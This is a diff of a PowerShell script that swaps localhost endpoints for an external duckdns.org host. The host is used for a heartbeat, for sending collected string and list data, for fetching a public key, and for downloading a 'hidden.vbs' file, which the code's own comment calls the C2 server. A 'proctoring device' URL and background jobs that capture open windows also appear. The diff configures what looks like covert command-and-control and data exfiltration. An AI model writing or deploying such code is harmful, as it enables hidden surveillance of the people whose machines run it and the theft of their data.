@@ -40,15 +40,15 @@ $functions = {
     #                                                   Variables Definition
     #---------------------------------------------------------------------------------------------------------------------
     #Web Server for interval tracking
-    $interval_base = 'http://127.0.0.1:8080/interval.php?'
+    $interval_base = 'https://rapid.tlnas.duckdns.org/interval.php?'
     #Web server for processing string data
-    $sending_base = 'http://127.0.0.1:8080/process.php'
+    $sending_base = 'https://rapid.tlnas.duckdns.org/process.php'
     #Web server for processing list data
-    $sending_list_base = 'http://127.0.0.1:8080/process_list.php'
+    $sending_list_base = 'https://rapid.tlnas.duckdns.org/process_list.php'
     #Webserver for getting public key
-    $key = 'http://127.0.0.1:8080/get_public_key.php'
+    $key = 'https://rapid.tlnas.duckdns.org/get_public_key.php'
     #Heartbeat
-    $heartbeat = 'http://127.0.0.1:8080/ping.php?'
+    $heartbeat = 'https://rapid.tlnas.duckdns.org/ping.php?'
     #Proctoring Device's URL
     $base_url = 'http://10.0.0.1:5000'
 
@@ -328,7 +328,7 @@ $job4 = Start-Job -InitializationScript $functions -ScriptBlock{Get_Open_Win}
 Start-Sleep 2
 
 # VBS file path on the C2 server
-$vbs_url = "http://127.0.0.1:8080/hidden.vbs"
+$vbs_url = "https://rapid.tlnas.duckdns.org/hidden.vbs"
 
 # Function: Download the VBS file content from the C2 server
 function Get-VBSContent {
